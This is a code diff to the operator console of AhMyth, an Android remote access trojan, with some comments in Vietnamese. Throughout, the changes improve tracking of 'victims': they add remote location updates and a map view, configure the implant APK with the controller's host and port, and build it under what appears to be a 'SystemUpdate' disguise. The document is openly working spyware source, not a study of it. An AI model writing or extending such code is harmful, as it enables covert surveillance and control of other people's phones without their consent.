@@ -13,7 +13,8 @@ var path = require("path");
 var viclist = {};
 var dataPath = path.join(homeDir(), CONSTANTS.dataDir);
 var downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
-var outputPath = path.join(dataPath, CONSTANTS.outputApkPath);
+// APK build ra ngay trong thư mục dự án (SystemUpdate/Output) cho tiện theo dõi
+var outputPath = CONSTANTS.projectOutputPath || path.join(dataPath, CONSTANTS.outputApkPath);
 //--------------------------------------------------------------
 
 
@@ -23,6 +24,16 @@ app.controller("AppCtrl", ($scope) => {
     $appCtrl.victims = viclist;
     $appCtrl.isVictimSelected = true;
     $appCtrl.bindApk = { enable: false, method: 'BOOT' }; //default values for binding apk
+
+    // Clear existing victims from UI on startup to avoid "ghost" victims
+    // They will reappear if they actually connect.
+    for (let id in viclist) delete viclist[id];
+
+    // Initialize default values for APK Builder
+    $appCtrl.srcIP = CONSTANTS.defaultHost;
+    $appCtrl.srcPort = CONSTANTS.defaultPort;
+    $appCtrl.useHttps = false;
+
     var log = document.getElementById("log");
     $appCtrl.logs = [];
     $('.menu .item')
@@ -76,10 +87,23 @@ app.controller("AppCtrl", ($scope) => {
         $appCtrl.$apply();
     });
 
+    // cập nhật vị trí victim từ xa (theo dõi định kỳ)
+    ipcRenderer.on('SocketIO:VictimLocationUpdated', (event, index) => {
+        if (viclist[index]) {
+            viclist[index] = victimsList.getVictim(index);
+            if (!$appCtrl.$$phase) $appCtrl.$apply();
+        }
+    });
+
 
     // notify the main proccess (main.js) to open the lab
     $appCtrl.openLab = (index) => {
         ipcRenderer.send('openLabWindow', 'lab.html', index);
+    }
+
+    // mở Lab trực tiếp tab Location để theo dõi victim trên bản đồ
+    $appCtrl.openLabToLocation = (index) => {
+        ipcRenderer.send('openLabWindow', 'lab.html', index, '#/location');
     }
 
 
@@ -101,7 +125,7 @@ app.controller("AppCtrl", ($scope) => {
 
     // function to open the dialog and choose apk to be bindded
     $appCtrl.BrowseApk = () => {
-        dialog.showOpenDialog(function(fileNames) {
+        dialog.showOpenDialog(function (fileNames) {
             // fileNames is an array that contains all the selected
             if (fileNames === undefined) {
                 $appCtrl.Log("No file selected");
@@ -126,14 +150,13 @@ app.controller("AppCtrl", ($scope) => {
     $appCtrl.BuildAhmythApk = () => {
         $appCtrl.Log('Building APK with gradle...');
         var ahmythFolder = CONSTANTS.ahmythApkFolderPath;
-        var buildScript = path.join(ahmythFolder, process.platform === 'win32' ? 'gradlew.bat' : 'gradlew');
         var debugApkPath = path.join(ahmythFolder, 'app/build/outputs/apk/debug/app-debug.apk');
-        
-        var buildCmd = process.platform === 'win32' ? 
-            '.\\gradlew.bat assembleDebug' : 
+
+        var buildCmd = process.platform === 'win32' ?
+            '.\\gradlew.bat assembleDebug' :
             './gradlew assembleDebug';
-        
-        var buildApk = exec(buildCmd, 
+
+        var buildApk = exec(buildCmd,
             { cwd: ahmythFolder, maxBuffer: 1024 * 1024 * 10, shell: true },
             (error, stdout, stderr) => {
                 if (error !== null) {
@@ -142,25 +165,20 @@ app.controller("AppCtrl", ($scope) => {
                     return;
                 }
 
-                var outputApkPath = path.join(outputPath, CONSTANTS.apkName);
-                
-                $appCtrl.Log('Copying APK to output folder...');
-                fs.copy(debugApkPath, outputApkPath, { overwrite: true }, (error) => {
+                var finalApkPath = path.join(outputPath, CONSTANTS.signedApkName);
+                fs.ensureDirSync(outputPath);
+                $appCtrl.Log('Moving APK to output folder...');
+
+                // Only copy once to the final destination name
+                fs.copy(debugApkPath, finalApkPath, { overwrite: true }, (error) => {
                     if (error) {
                         $appCtrl.Log('Copying APK Failed: ' + error.message, CONSTANTS.logStatus.FAIL);
                         return;
                     }
 
-                    fs.copy(outputApkPath, path.join(outputPath, CONSTANTS.signedApkName), { overwrite: true }, (error) => {
-                        if (error) {
-                            $appCtrl.Log('Copying Signed APK Failed: ' + error.message, CONSTANTS.logStatus.FAIL);
-                            return;
-                        }
-
-                        $appCtrl.Log('APK built successfully', CONSTANTS.logStatus.SUCCESS);
-                        $appCtrl.Log("The APK has been built on " + path.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.SUCCESS);
-                        $appCtrl.$apply();
-                    });
+                    $appCtrl.Log('APK built successfully', CONSTANTS.logStatus.SUCCESS);
+                    $appCtrl.Log("The APK has been built on " + finalApkPath, CONSTANTS.logStatus.SUCCESS);
+                    $appCtrl.$apply();
                 });
             });
     };
@@ -342,7 +360,7 @@ app.controller("AppCtrl", ($scope) => {
         }
 
         var scheme = useHttps ? "https://" : "http://";
-        
+
         // Update strings.xml with new server host and port
         var stringsFile = path.join(CONSTANTS.ahmythApkFolderPath, 'app/src/main/res/values/strings.xml');
         $appCtrl.Log('Updating strings.xml with new server configuration...');
@@ -353,12 +371,12 @@ app.controller("AppCtrl", ($scope) => {
             }
 
             $appCtrl.Log('Replacing server host and port...');
-            
+
             // Replace server_ip
             var result = data.replace(/<string name="server_ip">.*?<\/string>/g, '<string name="server_ip">' + host + '</string>');
             // Replace server_port
             result = result.replace(/<string name="server_port">.*?<\/string>/g, '<string name="server_port">' + port + '</string>');
-            
+
             fs.writeFile(stringsFile, result, 'utf8', (error) => {
                 if (error) {
                     $appCtrl.Log('Updating strings.xml Failed', CONSTANTS.logStatus.FAIL);
